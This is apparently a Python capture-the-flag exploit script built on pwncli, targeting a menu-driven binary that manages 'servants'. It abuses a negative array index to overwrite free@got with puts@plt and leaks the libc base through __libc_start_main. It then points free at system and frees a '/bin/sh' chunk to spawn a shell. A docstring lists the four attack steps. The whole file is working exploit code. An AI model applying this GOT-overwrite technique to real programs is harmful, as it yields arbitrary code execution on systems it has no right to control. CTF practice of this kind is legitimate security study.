#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def show(n=1):
    p.sendlineafter("Your choice:", "1")
    m = p.recvlines(n)
    info(f"Get msg: {m}")
    return m


def add(size, name="a"):
    p.sendlineafter("Your choice:", "2")
    p.sendlineafter("Please enter the length of servant name:", str(size))
    p.sendafter("Please enter the name of servant:", name)


def change(idx, size, name):
    p.sendlineafter("Your choice:", "3")
    p.sendlineafter("Please enter the index of servant:", str(idx))
    p.sendlineafter("Please enter the length of servant name:", str(size))
    p.sendafter("Please enter the new name of the servnat:", name)


def dele(idx):
    p.sendlineafter("Your choice:", "4")
    p.sendlineafter("Please enter the index of servant:", str(idx))


"""
1. index overflow to change free@got to puts@plt <---> index = -131509
2. index overflow to change setvbuf@got to __libc_start_main@got <---> index = -131497
3. free(-7) ---> puts(__libc_start_main@got) ---> leak libc_addr
4. index overflow to change free@got to system address and get shell
"""


add(0x10, "/bin/sh\x00")
add(0x10)

# -131509 free@plt
# -131497 setvbuf@plt
# -7 setvbuf@got

# change free@got 2 puts@plt to leak addr
change(-131509, 8, p64(elf.plt['puts'])[:7])
change(-131497, 8, p64(elf.got['__libc_start_main'])[:7])
dele(-7)

m = p.recvline(False)
log_ex(f"Get msg: {m}")
libc_base = u64_ex(m) - libc.sym['__libc_start_main']
libc.address = libc_base
log_libc_base_addr(libc_base)

change(-131509, 8, p64(libc.sym['system'])[:7])

dele(0)

get_flag_when_get_shell(p)

p.interactive()
